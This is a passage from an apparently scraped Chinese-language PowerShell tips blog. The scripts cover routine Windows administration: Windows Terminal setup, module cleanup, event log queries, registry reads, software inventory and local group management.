如果计划在其中一个控制台中运行冗长的任务或关键业务脚本，则可能需要将该应用程序转换为仅由您自己控制的便携式应用程序。这样，多个用户也可以使用 Windows App。 以下脚本要求您已安装 Windows Terminal 应用程序，并且必须以管理员权限运行代码： 123456789101112131415161718192021222324252627282930#requires -RunAsAdmin# location to store portable app$destination = 'c:\\windowsterminal'# search for installed apps...Get-ChildItem &quot;$env:programfiles\\WindowsApps\\&quot; |# pick Windows Terminal...Where-Object name -like *windowsterminal* |# find the executable...Get-ChildItem -Filter wt.exe |# identify executable versions...Select-Object -ExpandProperty VersionInfo |# sort versions...Sort-Object -Property ProductVersion -Descending |# pick the latest...Select-Object -First 1 -ExpandProperty filename |# get parent folder...Split-Path |# dump folder content...Get-ChildItem |# copy to destination folderCopy-Item -Destination $destination -Force# open folderexplorer $destination# run portable appStart-Process -FilePath &quot;$destination\\wt.exe&quot;","link":"/2020/11/06/turn-windows-terminal-into-a-portable-app/"},{"title":"PowerShell 技能连载 - 调优 Windows Terminal","text":"在前面的技能中，我们介绍了如何通过 Microsoft Store 在 Windows 10 上安装 “Windows Terminal”。Windows Terminal 将 PowerShell 控制台放在单独的标签页中，非常实用。 您可以通过编辑设置文件来控制选项卡下拉列表中可用的控制台类型：在 Windows Terminal 中，在标题栏中单击向下箭头按钮，然后选择“设置”。这将在关联的编辑器中打开一个 JSON 文件。如果没有与 JSON 文件关联的编辑器，则可以选择一个或使用记事本。 “配置文件”部分列出了您可以使用“向下箭头”按钮在 Windows Terminal 中打开的控制台类型。这是一个例子： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&quot;profiles&quot;: { &quot;defaults&quot;: { // Put settings here that you want to apply to all profiles. }, &quot;list&quot;: [ { // Make changes here to the powershell.exe profile. &quot;guid&quot;: &quot;{61c54bbd-c2c6-5271-96e7-009a87ff44bf}&quot;, &quot;name&quot;: &quot;Windows PowerShell&quot;, &quot;commandline&quot;: &quot;powershell.exe&quot;, &quot;hidden&quot;: false, &quot;useAcrylic&quot;: true, &quot;acrylicOpacity&quot; : 0.8, }, { // Make changes here to the cmd.exe profile. &quot;guid&quot;: &quot;{0caa0dad-35be-5f56-a8ff-afceeeaa6101}&quot;, &quot;name&quot;: &quot;Command Shell&quot;, &quot;commandline&quot;: &quot;cmd.exe&quot;, &quot;hidden&quot;: false, &quot;useAcrylic&quot;: true, &quot;acrylicOpacity&quot; : 0.8, }, { &quot;guid&quot;: &quot;{574e775e-4f2a-5b96-ac1e-a2962a402336}&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;PowerShell&quot;, &quot;source&quot;: &quot;Windows.Terminal.PowershellCore&quot;, &quot;useAcrylic&quot;: true, &quot;acrylicOpacity&quot; : 0.8, }, { &quot;guid&quot;: &quot;{2595cd9c-8f05-55ff-a1d4-93f3041ca67f}&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;PowerShell Preview (msix)&quot;, &quot;source&quot;: &quot;Windows.Terminal.PowershellCore&quot;, &quot;useAcrylic&quot;: true, &quot;acrylicOpacity&quot; : 0.8, }, { &quot;guid&quot;: &quot;{b453ae62-4e3d-5e58-b989-0a998ec441b8}&quot;, &quot;hidden&quot;: false, &quot;name&quot;: &quot;Azure Cloud Shell&quot;, &quot;source&quot;: &quot;Windows.Terminal.Azure&quot;, &quot;useAcrylic&quot;: true, &quot;acrylicOpacity&quot; : 0.8, }, { &quot;guid&quot;: &quot;{0caa0dae-35be-5f56-a8ff-afceeeaa6101}&quot;, &quot;name&quot;: &quot;Terminal As Admin&quot;, &quot;commandline&quot;: &quot;powershell.exe -command start 'C:/wt/wt.exe' -verb runas&quot;, &quot;icon&quot;: &quot;ms-appx:///Images/Square44x44Logo.targetsize-32.png&quot;, &quot;hidden&quot;: false }, { &quot;guid&quot;: &quot;{0ca30dae-35be-5f56-a8ff-afceeeaa6101}&quot;, &quot;name&quot;: &quot;ISE Editor&quot;, &quot;commandline&quot;: &quot;powershell.exe -command powershell_ise&quot;, &quot;icon&quot;: &quot;c:/wt/ise.ico&quot;, &quot;hidden&quot;: false }, { &quot;guid&quot;: &quot;{b39ac7db-ace0-4165-b312-5f2dfbbe4e4d}&quot;, &quot;name&quot;: &quot;VSCode&quot;, &quot;commandline&quot;: &quot;cmd.exe /c \\&quot;%LOCALAPPDATA%/Programs/Microsoft VS Code/code.exe\\&quot;&quot;, &quot;icon&quot;: &quot;c:/wt/vscode.ico&quot;, &quot;hidden&quot;: false } ] } 如您所见，您可以定义任何可执行文件的路径，使用 “useAcrylic” 和 “acrylicOpacity” 等选项可以控制透明度。 看一下列表末尾的条目：它们说明了如何使用下拉菜单启动外部程序，例如编辑器（VSCode、ISE），甚至使用管理员权限打开 Windows Terminal。 诀窍是使用 “cmd.exe /c“ 或 “powershell“ 启动外部应用程序。如果直接启动外部应用程序，这将导致空白的选项卡窗口保持打开状态，直到再次关闭外部应用程序。 还要注意如何将喜欢的图标添加到列表项：使用 “icon” 并提交位图或 ico 文件。在即将发布的技巧中，我们将展示如何通过 PowerShell 代码创建此类图标文件。 如果您打算将新条目添加到列表中，请记住每个条目都需要一个唯一的 GUID。在 PowerShell 中，可以使用 New-Guid 来创建一个。 保存 JSON 文件后，修改立即生效。如果您进行的 JSON 编辑损坏了文件或引入了语法错误（例如不匹配的引号等），则 Windows Terminal 会报错。最好在编辑之前制作备份副本，并使用像 VSCode 这样的编辑器来支持 JSON 格式，并通过语法错误提示来帮助您。","link":"/2020/11/10/fine-tuning-windows-terminal/"},{"title":"PowerShell 技能连载 - 创建图标","text":"在上一个技能中，我们展示了如何微调 “Windows Terminal” 并将新的项目添加到可启动应用程序列表中。如果要为这些条目添加图标，则需要适当的图标文件。 这是一些从可执行文件中提取图标的 PowerShell 代码。您可以在 Windows Terminal 和其他地方使用生成的 ICO 文件。 123456789101112131415161718# create output folder$destination = &quot;c:\\icons&quot;mkdir $destination -ErrorAction IgnoreAdd-Type -AssemblyName System.Drawing# extract PowerShell ISE icon$path = &quot;$env:windir\\system32\\windowspowershell\\v1.0\\powershell_ise.exe&quot;$name = &quot;$destination\\ise.ico&quot;[System.Drawing.Icon]::ExtractAssociatedIcon($path).ToBitmap().Save($name)# extract Visual Studio Code icon$Path = &quot;$env:LOCALAPPDATA\\Programs\\Microsoft VS Code\\code.exe&quot;$name = &quot;$destination\\vscode.ico&quot;[System.Drawing.Icon]::ExtractAssociatedIcon($path).ToBitmap().Save($name)explorer $destination","link":"/2020/11/12/creating-icons/"},{"title":"PowerShell 技能连载 - 修复 PowerShell Gallery 的访问","text":"The PowerShell Gallery (www.powershellgallery.com) 是查找新的 PowerShell 命令的理想场所。借助 Install-Module，您可以轻松下载并安装新的 PowerShell 模块。 但是，有时候会失败，有两个主要原因。 有时，Windows 10 自带的 PowerShellGet 模块已过时。然后，您会收到有关提示缺少参数或错误参数的异常信息。 要解决此问题，您需要手动更新 PowerShellGet。使用管理员权限运行以下行： 1Install-Module -Name PowerShellGet -Repository PSGallery -Force 第二个常见原因：Windows 版本不支持 TLS 1.2 协议。在这种情况下，您会遇到连接问题。尝试运行以下命令： 1[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 此设置适用于当前的 PowerShell 会话。如果要保留此设置，请将该行放入您的配置文件脚本中。该路径可以在 $profile 中找到。","link":"/2020/11/16/repairing-powershell-gallery-access/"},{"title":"PowerShell 技能连载 - 管理已安装的模块（第 1 部分）","text":"通过 Install-Module 安装新的 PowerShell 模块时，PowerShell 会记住安装位置。因此，很容易获得通过 Install-Module 安装的模块的列表： 1234567891011PS&gt; Get-InstalledModuleVersion Name Repository Description------- ---- ---------- -----------2.7.1.9 ISESteroids PSGallery Extension for PowerShell ISE 3.0 and better2.2.0 PoSHue PSGallery Script and Control your Philips Hue Bridge, Lights, Gro...0.14.0 platyPS PSGallery Generate PowerShell External Help files from Markdown2.4 PSOneTools PSGallery commands taken from articles published at https://power...1.0 QRCodeGenerator PSGallery Automatically creates QR codes as PNG images for person...1.0 ScriptBlockLoggingAnalyzer PSGallery Functions to manage PowerShell script block logging1.0 UserProfile PSGallery This module manages user profiles on local and remote c... 由于新版本是并行安装的，因此可以搜索不再需要的旧版本： 12Get-InstalledModule |Get-InstalledModule -AllVersions","link":"/2020/11/18/managing-installed-modules-part-1/"},{"title":"PowerShell 技能连载 - 管理已安装的模块（第 2 部分）","text":"每当您通过 Install-Module 安装新模块或通过 Update-Module 更新现有模块时，新模块版本就会并行地安装。 如果您始终使用最新版本的模块，而无需访问特定的旧版本，则可能需要查找过时的模块并将其删除： 123456789101112131415161718# get all installed modules as a hash table# each key holds all versions of a given module$list = Get-InstalledModule |Get-InstalledModule -AllVersions |Group-Object -Property Name -AsHashTable -AsString# take all module names...$list.Keys | ForEach-Object { # dump all present versions... $list[$_] | # sort by version descending (newest first) Sort-Object -Property Version -Descending | # and skip newest, returning all other Select-Object -Skip 1} |# remove outdated (check whether you really don't need them anymore)Uninstall-Module -WhatIf","link":"/2020/11/20/managing-installed-modules-part-2/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 宿主参数和可执行文件","text":"PowerShell 宿主可以使用参数启动，即您可以使用 –NoProfile 之类的参数运行 powershell.exe 或 pwsh.exe，或提交要执行的脚本的路径。 在外壳中，您始终可以查看启动此外壳程序的命令，包括其他参数： 123$exe, $parameters = [System.Environment]::GetCommandLineArgs()&quot;EXE: $exe&quot;&quot;Args: $parameters&quot; 当您使用 -NoProfile 启动 powershell.exe 时，结果如下所示： EXE: C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\PowerShell.exe Args: -noprofile 当您传入多个参数时，$parameters 是一个数组。","link":"/2020/11/24/finding-powershell-host-arguments-and-executable/"},{"title":"PowerShell 技能连载 - 禁止错误提示","text":"使用 cmdlet，禁止错误提示似乎很容易：只需添加 –ErrorAction Ignore 参数。 但是，事实证明，这并不能消除所有错误。它仅禁止 cmdlet 选择处理的错误。特别是与安全相关的异常仍然显示。 如果要禁止所有错误提示，可以通过在命令尾部 2&gt;$null 将异常传递给 null： PS&gt; Get-Service foobar 2&gt;$null 这适用于所有命令甚至原生方法的调用。只需将代码括在大括号中，然后通过 ＆ 调用运算符来进行调用： 123456PS&gt; [Net.DNS]::GetHostEntry('notPresent')MethodInvocationException: Exception calling &quot;GetHostEntry&quot; with &quot;1&quot; argument(s): &quot;No such host is known.&quot;PS&gt; &amp; {[Net.DNS]::GetHostEntry('notPresent')} 2&gt;$nullPS&gt;","link":"/2020/11/26/suppressing-errors/"},{"title":"PowerShell 技能连载 - 恒定函数","text":"在 PowerShell中，您可以对函数进行写保护。当您这样做时，将无法在运行的 PowerShell 会话期间更改、覆盖或删除函数。尽管可能没有明显的作用。该方法如下： 12345678910111213141516$code ={ param ( [string] [Parameter(Mandatory)] $SomeParameter ) &quot;I have received $SomeParameter and could now process it...&quot;}$null = New-Item -Path function:Invoke-Something -Options Constant,AllScope -Value $code# run the function like thisInvoke-Something -SomeParameter &quot;My Data&quot; 由于该函数现在是恒定的，因此尝试重新定义它将会失败： 123456# you can no longer overwrite the function# the following code raises an exception nowfunction Invoke-Something{ # some new code} 取消该效果的唯一方法是重新启动 PowerShell 会话。恒定变量是一个更有用的方案：通过将重要数据存储在写保护变量中，可以确保它们不会因意外或有意更改。此行定义了一个写保护变量 $testserver1，其中包含一些内容： 1Set-Variable -Name testserver1 -Value server1 -Option Constant, AllScope","link":"/2020/11/30/constant-functions/"},{"title":"PowerShell 技能连载 - 读取上次登录的用户和其他注册表值","text":"使用 PowerShell 读取一些注册表值通常很容易：只需使用 Get-ItemProperty。此代码段读取 Windows 操作系统的才详细信息，例如： 1234$Path = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;Get-ItemProperty -Path $Path |Select-Object -Property ProductName, CurrentBuild, ReleaseId, UBR 结果看起来像这样： ProductName CurrentBuild ReleaseId UBR ----------- ------------ --------- --- Windows 10 Pro 19042 2009 630 不幸的是，Get-ItemProperty 实际上得与 Select-Object 结合使用才理想，因为 cmdlet 总是会添加许多属性。如果您只想读取一个注册表值，即最后一个登录的用户，则始终需要将两者结合起来： 1234$Path = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI&quot;Get-ItemProperty -Path $Path |Select-Object -ExpandProperty LastLoggedOnUser 另外，您可以将 Get-ItemProperty 的结果存储在变量中，并使用点号访问各个注册表值： 1234$Path = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI&quot;$values = Get-ItemProperty -Path $Path$values.LastLoggedOnUser 如果此调用不能帮助您从其他用户帐户启动 Windows Terminal，那么在即将发布的技能中，我们将说明如何将应用程序转变为不再由 Windows 管理的便携式应用程序。取而代之的是，您可以用任何用户（包括高级帐户）运行它。敬请关注。 1234$Path = &quot;HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI&quot;$key = Get-Item -Path $Path$key.GetValue('LastLoggedOnUser')","link":"/2020/12/02/reading-last-logged-on-user-and-other-registry-values/"},{"title":"PowerShell 技能连载 - 读取事件日志（第 1 部分）","text":"在 Windows 中，有许多事件日志，例如“系统”和“应用程序”，在 Windows PowerShell 中，使用 Get-EventLog 从这些日志中检索事件条目很简单。这种单行代码从您的系统事件日志中返回最新的五个错误事件： 1PS&gt; Get-EventLog -LogName System -EntryType Error -Newest 5 | Out-GridView 在 PowerShell 7 和更高版本中，cmdlet Get-EventLog 不再存在。它被使用不同语法的 Get-WinEvent 代替，并且查询条件以哈希表的形式传入： 1234Get-WinEvent -FilterHashtable @{ LogName = 'System' Level = 2} -MaxEvents 5 “Level”键是一个数字值，值越小，事件越紧急。 ID 号 2 代表“错误”条目。 ID 号 3 将代表“警告”条目。要查看错误和警告，请提交一个数组： 1234Get-WinEvent -FilterHashtable @{ LogName = 'System' Level = 2,3 } -MaxEvents 5 即使您正在使用 Windows PowerShell，并且不打算很快过渡到 PowerShell 7，现在还是该习惯于 Get-WinEvent 和弃用 Get-EventLog 的时候，因为新的 Get-WinEvent 自 PowerShell 3 起就可用，并确保您的代码也将在将来的 PowerShell 版本中无缝运行。 此外，Get-WinEvent 不仅可以访问一些经典的 Windows 事件日志，还可以访问所有特定于应用程序的事件。另外，与从 Get-EventLog 接收到的结果相比， Get-WinEvent 传递的结果更加完整：后者偶尔返回带有诸如“找不到事件 xyz 的描述”之类的消息的结果。Get-WinEvent 始终返回完整的消息。","link":"/2020/12/04/reading-event-logs-part-1/"},{"title":"PowerShell 技能连载 - 读取事件日志（第 2 部分）","text":"在上一个技能中，我们鼓励您弃用 Get-EventLog cmdlet，而开始使用 Get-WinEvent——因为后者功能更强大，并且在 PowerShell 7 中不再支持前者。 让我们再次练习如何将 Get-EventLog 语句转换为 Get-WinEvent。这是我想翻译的一行代码。它从过去 48 小时内发生的系统事件日志中返回所有错误和警告： 1$twoDaysAgo = (Get-Date).AddDays(-2)Get-EventLog -LogName System -EntryType Error, Warning -After $twoDaysAgo 这将是在所有 PowerShell 版本中均可使用的 Get-WinEvent 单行代码： 12$twoDaysAgo = (Get-Date).AddDays(-2)Get-WinEvent -FilterHashtable @{ LogName = 'System' Level = 2,3 StartTime = $twoDaysAgo } 它返回相同的事件，但是速度更快。以下是您可以在哈希表中使用的其余键： col 1 col 2 col 3 Key name Data Type Wildcards Allowed LogName &lt;String[]&gt; Yes ProviderName &lt;String[]&gt; Yes Path &lt;String[]&gt; No Keywords &lt;Long[]&gt; No ID &lt;Int32[]&gt; No Level &lt;Int32[]&gt; No StartTime No EndTime No UserID No Data &lt;String[]&gt; No","link":"/2020/12/08/reading-event-logs-part-2/"},{"title":"PowerShell 技能连载 - 读取事件日志（第 3 部分）","text":"在上一个技能中，我们鼓励您弃用 Get-EventLog cmdlet，而开始使用 Get-WinEvent——因为后者功能更强大，并且在 PowerShell 7 中不再支持前者。 与 Win-EventLog 相比，Get-WinEvent 的优点之一是它能够读取所有 Windows 事件日志，而不仅仅是经典事件日志。要找出这些其他事件日志的名称，请尝试以下操作： 1234Get-WinEvent -ListLog * -ErrorAction Ignore | # ...that have records... Where-Object RecordCount -gt 0 | Sort-Object -Property RecordCount -Descending 这将返回系统上所有包含数据的事件日志的列表，并按记录的事件数进行排序。显然，诸如“系统”和“应用程序”之类的“经典”日志比较显眼，但是还有许多其他有价值的日志，例如“具有高级安全性/防火墙的 Microsoft-Windows-Windows 防火墙”。让我们检查其内容： 123Get-WinEvent -FilterHashtable @{ LogName = 'Microsoft-Windows-Windows Firewall With Advanced Security/Firewall' } -MaxEvents 20 由于我的系统正在使用内置防火墙，因此结果将返回有关更改防火墙规则和其他配置历史记录的详细信息。 使用不推荐使用的 Get-EventLog 将无法获得此信息。","link":"/2020/12/10/reading-event-logs-part-3/"},{"title":"PowerShell 技能连载 - 读取事件日志（第 4 部分）","text":"在上一个技巧中，我们鼓励您弃用 Get-EventLog cmdlet，而开始使用 Get-WinEvent，因为后者功能更强大，并且在PowerShell 7 中不再支持前者。 如上例所示，通过 Get-WinEvent 查询事件需要一个哈希表。例如，以下命令返回已安装更新的列表： 12345Get-WinEvent -FilterHashtable @{ LogName = 'System' ProviderName = 'Microsoft-Windows-WindowsUpdateClient' Id = 19 } 实际上，事件数据始终使用 XML 格式存储，并且所有查询都使用 XPath 过滤器查询来为您检索数据。如果您是 XML 和XPath专家，则可以直接使用以下命令来获得相同的结果： 123Get-WinEvent -FilterXML @'&lt;QueryList&gt;&lt;Query Id=&quot;0&quot; Path=&quot;system&quot;&gt;&lt;Select Path=&quot;system&quot;&gt;*[System/Provider[@Name='microsoft-windows-windowsupdateclient'] and (System/EventID=19)]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;'@ 哈希表是一个很方便的快捷方式。在内部，哈希表中包含的信息将转换为上面的 XML 语句。幸运的是，将哈希表转换为 XML 一点也不困难，因为 Get-WinEvent 会为您做到这一点：只需提交一个哈希表，并要求返回 XML 语句： 1234567$result = Get-WinEvent -FilterHashtable @{ LogName = 'System' ProviderName = 'Microsoft-Windows-WindowsUpdateClient' Id = 19 } -MaxEvents 1 -Verbose 4&gt;&amp;1$result | Where-Object { $_ -is [System.Management.Automation.VerboseRecord] } 本质上，通过提交 -Verbose 参数，要求 Get-WinEvent 将计算出的XML语句返回给您。通过将管道 4 重定向到输出管道 1，您可以将详细消息捕获到 $result 并过滤详细消息。这样，您可以捕获计算出的XML： VERBOSE: Found matching provider: Microsoft-Windows-WindowsUpdateClient VERBOSE: The Microsoft-Windows-WindowsUpdateClient provider writes events to the System log. VERBOSE: The Microsoft-Windows-WindowsUpdateClient provider writes events to the Microsoft-Windows-WindowsUpdateClient/Operational log. VERBOSE: Constructed structured query: VERBOSE: &lt;QueryList&gt;&lt;Query Id=&quot;0&quot; Path=&quot;system&quot;&gt;&lt;Select Path=&quot;system&quot;&gt;*[System/Provider[@Name='microsoft-windows-windowsupdateclient'] and VERBOSE: (System/EventID=19)]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;.","link":"/2020/12/14/reading-event-logs-part-4/"},{"title":"PowerShell 技能连载 - 保持 Windows 和 PowerShell 持续运行","text":"根据 Windows PC 的电源设置，即使您在运行冗长的脚本，您的计算机仍可能在一段时间后进入待机或休眠状态。 确保 Windows 在脚本忙时继续运行的一种方法是使用“演示模式”。您可以使用一个工具来启用和禁用它。在 PowerShell 中，运行以下命令： 1PS&gt; presentationsettings 这将打开一个窗口，您可以在其中检查和控制当前的演示文稿设置。要自动启动和停止演示模式，该命令支持参数 /start 和 /stop。 为了确保 Windows 在脚本运行时不会进入休眠状态，请将其放在第一行脚本中： 1PS&gt; presentationsettings /start 在脚本末尾，关闭演示模式，如下所示： 1PS&gt; presentationsettings /stop 要验证这两个命令的效果，请运行不带参数的命令，并选中对话框中最上方的复选框。","link":"/2020/12/16/keeping-windows-and-powershell-running/"},{"title":"PowerShell 技能连载 - 读取已安装的软件（第 1 部分）","text":"Get-ItemProperty cmdlet 可以比大多数用户知道的功能强大得多的方式读取注册表值。该 cmdlet 支持多个注册表路径，并且支持通配符。这样，只需一行代码即可从四个注册表项读取所有已安装的软件（及其卸载字符串）： 12345678910111213141516# list of registry locations where installed software is stored$paths =# all users x64'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',# all users x86'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',# current user x64'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',# current user x86'HKCU:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'Get-ItemProperty -ErrorAction Ignore -Path $paths | # eliminate all entries with empty DisplayName Where-Object DisplayName | # select some properties (registry values) Select-Object -Property DisplayName, DisplayVersion, UninstallString, QuietUninstallString","link":"/2020/12/18/reading-installed-software-part-1/"},{"title":"PowerShell 技能连载 - 读取已安装的软件（第 2 部分）","text":"在上一个技能中，我们演示了 Get-ItemProperty 强大的功能，并且您可以通过读取多个注册表位置而仅用一行代码来创建整个软件清单。 今天，让我们在软件清单中添加两个重要的信息：范围（是为每个用户安装的软件还是为所有用户安装的软件？）和体系结构（x86或x64）。 每个信息都无法在注册表键值中找到，而是通过确定信息在注册表中的存储位置来找到。这是 Get-ItemProperty 提供的另一个巨大好处：它不仅返回给定注册表项的注册表值。它还添加了许多属性，例如 PSDrive（注册表配置单元）和 PSParentPath（正在读取注册表项的路径）。 以下是根据发现信息的地方将范围和体系结构信息添加到软件清单的解决方案： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# Registry locations for installed software$paths = # all users x64 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', # all users x86 'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', # current user x64 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*', # current user x86 'HKCU:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'# calculated properties# AllUsers oder CurrentUser?$user = @{ Name = 'Scope' Expression = { if ($_.PSDrive -like 'HKLM') { 'AllUsers' } else { 'CurrentUser' } }}# 32- or 64-Bit?$architecture = @{ Name = 'Architecture' Expression = { if ($_.PSParentPath -like '*\\WOW6432Node\\*') { 'x86' } else { 'x64' } }}Get-ItemProperty -ErrorAction Ignore -Path $paths | # eliminate reg keys with empty DisplayName Where-Object DisplayName | # select desired properties and add calculated properties Select-Object -Property DisplayName, DisplayVersion, $user, $architecture","link":"/2020/12/22/reading-installed-software-part-2/"},{"title":"PowerShell 技能连载 - 标识本地管理员帐户的名称","text":"有时，PowerShell 脚本需要访问或使用内置的 Administrator 帐户或内置的 Administrators组。不幸的是，它们的名称已本地化，因此它们的名称可以根据 Windows 操作系统的语言进行更改。 但是，它们确实使用了恒定的（众所周知的）SID（安全标识符）。通过使用 SID，您可以获得名称。对于本地 Administrator组，这很简单，因为 SID 始终是已知的：S-1-5-32-544。使用一行代码，可以翻译 SID。这是从德文系统获得的结果： 12PS&gt; ([Security.Principal.SecurityIdentifier]'S-1-5-32-544').Translate([System.Security.Principal.NTAccount]).ValueVORDEFINIERT\\Administratoren 使用内置管理员等帐户，就不那么简单了。在此，只有 RID（相对标识符）是已知的：-500。 通过简单的WMI查询，您将获得与过滤器匹配的帐户： 12345PS&gt; Get-CimInstance -ClassName Win32_UserAccount -Filter &quot;LocalAccount = TRUE and SID like 'S-1-5-%-500'&quot;Name Caption AccountType SID Domain---- ------- ----------- --- ------Administrator DELL7390\\Administrator 512 S-1-5-21-2770831484-2260150476-2133527644-500 DELL7390","link":"/2020/12/24/identifying-name-of-local-administrator-account/"},{"title":"PowerShell 技能连载 - 管理本地组成员（第 1 部分）","text":"幸运的是，PowerShell 5 及更高版本附带了诸如 Get-LocalGroupMember 之类的 cmdlet，该 cmdlet 列出了本地组的成员。不幸的是，这些 cmdlet 有一个缺陷：如果组包含一个或多个孤立成员，则该 cmdlet 将无法列出任何组成员。 孤立的组成员可以是已添加到组中但后来在 Active Directory 中删除的用户或组。这样的孤儿显示为 SID 号，而不是对话框中的名称。 若要解决此问题并列出组成员而不考虑孤立帐户，请尝试使用 Get-GroupMemberLocal 函数，该函数使用 PowerShell 自带 cmdlet 之前前通常使用的，旧的 ADSI 方法： 12345678910111213141516171819202122232425262728293031323334353637383940function Get-GroupMemberLocal{ [CmdletBinding(DefaultParameterSetName='Name')] param ( [Parameter(Mandatory,Position=0,ParameterSetName='Name')] [string] $Name, [Parameter(Mandatory,Position=0,ParameterSetName='Sid')] [System.Security.Principal.SecurityIdentifier] $Sid, [string] $Computer = $env:COMPUTERNAME ) if ($PSCmdlet.ParameterSetName -eq 'Sid') { $Name = $sid.Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[-1] } $ADSIComputer = [ADSI](&quot;WinNT://$Computer,computer&quot;) $group = $ADSIComputer.psbase.children.find($Name, 'Group') $group.psbase.invoke(&quot;members&quot;) | ForEach-Object { try { $disabled = '-' $disabled = $_.GetType().InvokeMember(&quot;AccountDisabled&quot;, 'GetProperty', $null, $_, $null) } catch {} [PSCustomObject]@{ Name = $_.GetType().InvokeMember(&quot;Name&quot;, 'GetProperty', $null, $_, $null) SID = [Security.Principal.SecurityIdentifier]::new($_.GetType().InvokeMember(&quot;objectSid&quot;, 'GetProperty', $null, $_, $null),0) Path = $_.GetType().InvokeMember(&quot;AdsPath&quot;, 'GetProperty', $null, $_, $null) Type = $_.GetType().InvokeMember(&quot;Class&quot;, 'GetProperty', $null, $_, $null) Disabled = $disabled } } } 下面是一个实际示例：让我们转储本地管理员组。您可以按名称或不区分文化的 SID 来访问组： 12345678PS&gt; Get-GroupMemberLocal -Sid S-1-5-32-544 | Format-TableName SID Path Type Disabled---- --- ---- ---- --------Administrator S-1-5-21-2770831484-2260150476-2133527644-500 WinNT://WORKGROUP/DELL7390/Administrator User TruePresentation S-1-5-21-2770831484-2260150476-2133527644-1007 WinNT://WORKGROUP/DELL7390/Presentation User FalseRemoteAdmin S-1-5-21-2770831484-2260150476-2133527644-1013 WinNT://WORKGROUP/DELL7390/RemoteAdmin User FalseManagement S-1-5-21-2770831484-2260150476-2133527644-1098 WinNT://WORKGROUP/DELL7390/Management Group -","link":"/2020/12/28/managing-local-group-members-part-1/"},{"title":"PowerShell 技能连载 - 管理本地组成员（第 2 部分）","text":"在上一个技巧中，我们解释了为什么访问本地组成员并不总是与内置的 cmdlet（如 Get-LocalGroupMember）一起使用，以及使用旧的（但仍可正常使用）ADSI 接口解决该问题的方法。 如果您想以此为基础构建解决方案，您可能想知道如何将本地帐户添加到组或从组中删除，以及如何启用和禁用本地管理员帐户。 这是说明这些方法的几行有用的代码。您可以独立使用这些代码，也可以将它们集成到自己的脚本逻辑中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# these examples use the data below - adjust to your needs# DO NOT RUN THESE LINES UNLESS YOU CAREFULLY# REVIEWED AND YOU KNOW WHAT YOU ARE DOING!# use local machine$ComputerName = $env:computername# find name of local Administrators group$Group = ([Security.Principal.SecurityIdentifier]'S-1-5-32-544').Translate([System.Security.Principal.NTAccount]).Value.Split('\\')[-1]# find name of local Administrator user$Admin = Get-CimInstance -ClassName Win32_UserAccount -Filter &quot;LocalAccount = TRUE and SID like 'S-1-5-%-500'&quot;$UserName = $Admin.Name# examples# find all local groups$computerObj = [ADSI](&quot;WinNT://$ComputerName,computer&quot;)$computerObj.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | Select-Object -Property @{N='Name';E={$_.Name[0]}}, Path, @{N='Sid';E={[Security.Principal.SecurityIdentifier]::new($_.objectSid.value,0).Value}}# find members of local admin group$computerObj = [ADSI](&quot;WinNT://$ComputerName,computer&quot;)$groupObj = $computerObj.psbase.children.find($Group, 'Group')$groupObj.psbase.Invoke('Members') | ForEach-Object { $_.GetType().InvokeMember('ADspath','GetProperty',$null,$_,$null) }# add user to group/remove from group$computerObj = [ADSI](&quot;WinNT://$ComputerName,computer&quot;)$groupObj = $computerObj.psbase.children.find($Group, 'Group')# specify the user or group to add or remove$groupObj.Add('WinNT://DOMAIN/USER,user')$groupObj.Remove('WinNT://DOMAIN/USER,user')# enabling/disabling accounts$computerObj = [ADSI](&quot;WinNT://$ComputerName,computer&quot;)$userObj = $computerObj.psbase.children.find($UserName, 'User')#enable$userObj.UserFlags=$userObj.UserFlags.Value -band -bnot 512$userObj.CommitChanges()#disable$userObj.UserFlags=$userObj.UserFlags.Value -bor 512$userObj.CommitChanges()","link":"/2020/12/30/managing-local-group-members-part-2/"},{"title":"PowerShell 技能连载 - 更好的递归","text":"当函数调用自身时，称为“递归”。当脚本想要遍历文件系统的一部分时，您会经常看到这种技术：一个函数处理文件夹内容，当它遇到子文件夹时，它会调用自身。 递归的功能很强大，但是却很难调试，并且有潜在的危险。因为当您犯错时，您将陷入无休止的循环。此外，递归深度过高时，始终存在堆栈溢出的风险。 许多通常需要递归的任务也可以通过使用“队列”来设计：当您的代码遇到新任务时，无需再次调用自身，而是将新任务放在队列中，一旦完成初始任务，开始解决队列中的任务。 感谢 Lee Holmes，这是一个遍历整个驱动器 C:\\ 但不使用递归的简单示例。相反，您可以看到正在使用的队列： 123456789101112131415161718192021222324252627282930313233# get a new queue[System.Collections.Queue]$queue = [System.Collections.Queue]::new()# place the initial search path(s) into the queue$queue.Enqueue('c:\\')# add as many more search paths as you need# they will eventually all be traversed#$queue.Enqueue('D:\\')# while there are still elements in the queue... while ($queue.Count -gt 0) { # get 